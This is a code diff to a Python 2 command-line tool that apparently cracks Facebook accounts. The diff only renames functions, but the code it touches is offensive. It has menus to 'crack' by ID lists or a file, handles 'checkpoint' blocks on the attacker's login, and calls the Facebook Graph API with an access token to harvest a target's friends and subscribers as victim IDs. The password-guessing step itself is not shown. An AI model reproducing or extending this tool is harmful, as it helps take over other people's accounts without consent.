@@ -213,7 +213,7 @@ def menu_option():
 	elif select =='2':
 		choice_crack()
 	elif select =='3':
-		name_crack()
+		crack_b()
 	elif select =='4':
 	    ex_id()
 	else:
@@ -786,7 +786,7 @@ def cs():
 	print('')
 	raw_input('\x1b[1;92m Press enter to back')
 	menu()
-def name_crack():
+def crack_b():
 	global token
 	os.system('clear')
 	try:
@@ -807,8 +807,8 @@ def name_crack():
 	print '\x1b[1;92m[3] Crack file'
 	print '\x1b[1;92m[0] Back'
 	print('')
-	n_s()
-def n_s():
+	a_s()
+def a_s():
 	select = raw_input('\x1b[1;36mSelect option: \x1b[0;97m')
 	id=[]
 	oks=[]
@@ -837,7 +837,7 @@ def n_s():
 			print('\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m')
 			print('')
 			raw_input('\x1b[1;92m Press enter to back')
-			name_crack()
+			crack_b()
 		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+token, headers=header)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -869,7 +869,7 @@ def n_s():
 			print('\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m')
 			print('')
 			raw_input(' Press enter to back')
-			name_crack()
+			crack_b()
 		r = requests.get('https://graph.facebook.com/'+idt+'/subscribers?access_token='+token+'&limit=999999', headers=header)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -901,14 +901,14 @@ def n_s():
 			print('\t    \x1b[1;37mRequested file not found\x1b[0;97m')
 			print('')
 			raw_input('\x1b[1;92m Press enter to back ')
-			name_crack()
+			crack_b()
 	elif select =='0':
 	    menu()
 	else:
 		print('')
 		print('\t    \x1b[1;31mSelect valid option\x1b[0;97m')
 		print('')
-		n_s()
+		a_s()
 	print('\x1b[1;96m Total IDs : '+str(len(id)))
 	print(' The Process has started')
 	print(47*'-')
